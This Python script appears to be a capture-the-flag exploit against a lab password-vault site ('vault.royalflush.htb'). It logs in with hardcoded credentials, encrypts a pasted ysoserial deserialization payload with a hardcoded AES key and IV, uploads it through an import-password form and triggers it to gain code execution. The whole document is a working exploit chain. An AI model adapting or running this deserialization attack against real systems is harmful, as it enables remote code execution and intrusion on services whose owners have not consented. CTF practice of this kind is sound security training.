#!/usr/bin/env python3
import requests
import urllib3
import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

urllib3.disable_warnings()

TARGET = "https://vault.royalflush.htb"
EMAIL = "jdover66@royalflush.htb"
PASSWORD = "42zyTJ94BwdKjEw1XNmt"
PASSWORD_KEY = "f3d9aa53-c08d-43"
PASSWORD_IV = "5ac8083e-8ff6-43"

ysoserial_b64 = input("Paste ysoserial payload (See the report for instructions on how to generate this payload): ").strip()

# Encrypt
print("Encrypting payload")
payload_bytes = base64.b64decode(ysoserial_b64)
cipher = AES.new(PASSWORD_KEY.encode(), AES.MODE_CBC, PASSWORD_IV.encode())
encrypted = cipher.encrypt(pad(payload_bytes, AES.block_size))
encrypted_b64 = base64.b64encode(encrypted).decode()

# Login

print("Logging in as " + EMAIL)
s = requests.Session()
s.verify = False
s.post(f"{TARGET}/Auth/Login", data={'email': EMAIL, 'password': PASSWORD})

# Inject
print("Sending the payload")
s.post(f"{TARGET}/My/ImportPassword", data={'name': 'test', 'encryptedPassword': encrypted_b64})

# Trigger
print("Triggering the payload...")
s.get(f"{TARGET}/My/Passwords")

print("Done")